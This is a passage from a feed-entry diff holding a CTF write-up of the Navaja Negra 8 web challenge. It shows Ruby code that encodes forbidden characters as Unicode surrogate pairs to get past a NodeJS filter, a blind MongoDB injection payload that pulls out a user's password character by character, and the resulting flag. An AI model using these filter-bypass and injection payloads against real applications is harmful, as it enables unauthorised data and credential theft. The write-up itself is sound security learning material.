+    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;A return without the URI encode for the string &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;|&lt;/code&gt;, the unicode &lt;code class=&quot;highlighter-rouge&quot;&gt;\u{1887c}&lt;/code&gt;  when divided in surrogate pairs:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;H: 0xD822
+L: 0xDC7C
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Their least significant byte’s match with &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;&lt;/code&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;|&lt;/code&gt; respectively.&lt;/p&gt;
+
+&lt;p&gt;So we got some restrictions to bypass using this trick, those restrictions are the characters forbidden by backend controller, a bit of code helps me to create strings based on this trick for the restricted characters:&lt;/p&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# Takes pairs of characters where a forbidden char is and&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# converts it to unicode representation.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;convert_forbidden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$waf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uni&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;true&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+          &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;URI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;skip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;false&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%2F&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;[&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%5B&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%5D&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;gsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;%26&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;For the string &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;||&quot;1==&quot;1&lt;/code&gt; this returns: &lt;code class=&quot;highlighter-rouge&quot;&gt;%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Testing on the live application, it works!! &lt;code class=&quot;highlighter-rouge&quot;&gt;/avatar/%F0%98%A1%BC%7C%F0%98%A0%B1%F0%98%A0%BD=%F0%98%A0%B1&lt;/code&gt; returns 1.jpg, the same process but using “1”==”0” instead of “1” ==”1” returns us 404.jpg. So we can confirm the injection.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploiting-blind-nosql-injection&quot;&gt;Exploiting Blind NoSQL Injection&lt;/h3&gt;
+&lt;p&gt;Now we need to write a bit more code to exfiltrate data, byte by byte. After some digging and refresh of MongoDB basics, it ended up on this payload:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pikachu&quot;&amp;amp;&amp;amp;(this.password.match(/^_string_/))==&quot;_string_&quot;||&quot;1&quot;==&quot;0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will return true only if the string starts with the &lt;em&gt;string&lt;/em&gt; value. Look at the script to get more details if you are unfamiliar with Blind techniques.&lt;/p&gt;
+
+&lt;h4 id=&quot;run-and-gimme-the-flag&quot;&gt;Run and gimme the flag!&lt;/h4&gt;
+&lt;p&gt;Running the final script starts exfiltrating us the password for the user pikachu, character by character, but we know that flag starts with &lt;code class=&quot;highlighter-rouge&quot;&gt;nn8ed{&lt;/code&gt;, so some work is done:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Found! nn8ed{T
+Found! nn8ed{Th
+Found! nn8ed{Thi
+... (lot of time)
+Found! nn8ed{This.Old.Challenge.With.Unic0de}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So there’s the flag. Super funny challenge, I learned a lot about how NodeJS 8 works with Unicode and how inconsistencies at encoding treatment can compromise a system.&lt;/p&gt;
+
+&lt;p&gt;Congratz to ka0labs.org for this great challenge!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+        <category term="ctf" />
+      
+        <category term="nn8ed" />
+      
+        <category term="nodejs" />
+      
+        <category term="bypass" />
+      
+        <category term="unicode" />
+      
+
+      
+
+      
+        <summary type="html">This weekend, Navaja Negra 8 CTF started, organized by ka0labs.org. This web challenge has the following statement:</summary>
+      
+
+      
+      
+    </entry>
+  
+  
+</feed>
